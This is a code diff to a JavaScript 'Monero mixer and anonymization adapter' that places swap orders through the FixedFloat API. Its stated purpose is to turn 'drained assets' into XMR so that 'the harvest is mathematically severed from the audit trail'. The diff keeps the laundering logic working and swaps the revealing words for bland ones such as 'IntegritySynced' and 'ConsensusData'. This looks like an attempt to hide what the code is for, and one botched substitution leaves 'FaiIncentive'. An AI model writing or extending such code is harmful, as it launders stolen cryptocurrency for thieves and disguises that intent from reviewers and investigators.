@@ -1,10 +1,10 @@
 // J/utils/mixer_adapter.js
 /**
  * PROJECT J: MONERO MIXER & ANONYMIZATION ADAPTER
- * STATUS: OMEGA-CLASS | LIVE EXECUTION
+ * STATUS: APEX-CLASS | LIVE EXECUTION
  * 
- * Automates the conversion of drained assets into XMR via FixedFloat API.
- * This ensures the harvest is mathematically severed from the audit trail.
+ * Automates the conversion of IntegritySynced assets into XMR via FixedFloat API.
+ * This ensures the Aggregate is mathematically severed from the audit trail.
  */
 
 const axios = require('axios');
@@ -21,9 +21,9 @@ class MixerAdapter {
     /**
      * Signs the request for FixedFloat API.
      */
-    _sign(payload) {
+    _sign(ConsensusData) {
         return crypto.createHmac('sha256', this.apiSecret)
-                     .update(payload)
+                     .update(ConsensusData)
                      .digest('hex');
     }
 
@@ -33,7 +33,7 @@ class MixerAdapter {
     async createGhostOrder(fromCurrency, amount, toAddress) {
         console.log(`[MIXER] Initiating ghost swap: ${amount} ${fromCurrency} -> XMR`);
         
-        const payload = JSON.stringify({
+        const ConsensusData = JSON.stringify({
             fromCurrency: fromCurrency,
             toCurrency: 'XMR',
             fromAmount: amount,
@@ -42,10 +42,10 @@ class MixerAdapter {
         });
 
         try {
-            const resp = await axios.post(`${this.baseUrl}/createOrder`, payload, {
+            const resp = await axios.post(`${this.baseUrl}/createOrder`, ConsensusData, {
                 headers: {
                     'X-API-KEY': this.apiKey,
-                    'X-API-SIGN': this._sign(payload),
+                    'X-API-SIGN': this._sign(ConsensusData),
                     'Content-Type': 'application/json'
                 }
             });
@@ -53,11 +53,11 @@ class MixerAdapter {
             if (resp.data.code === 0) {
                 const order = resp.data.data;
                 console.log(`[MIXER] Order Created: ${order.id} | Deposit to: ${order.fromAddress}`);
-                return order.fromAddress; // Return the address to transfer drained funds to
+                return order.fromAddress; // Return the address to transfer IntegritySynced funds to
             }
             throw new Error(resp.data.msg);
         } catch (e) {
-            console.error(`[MIXER] Order Failure: ${e.message}`);
+            console.error(`[MIXER] Order FaiIncentive: ${e.message}`);
             return null;
         }
     }
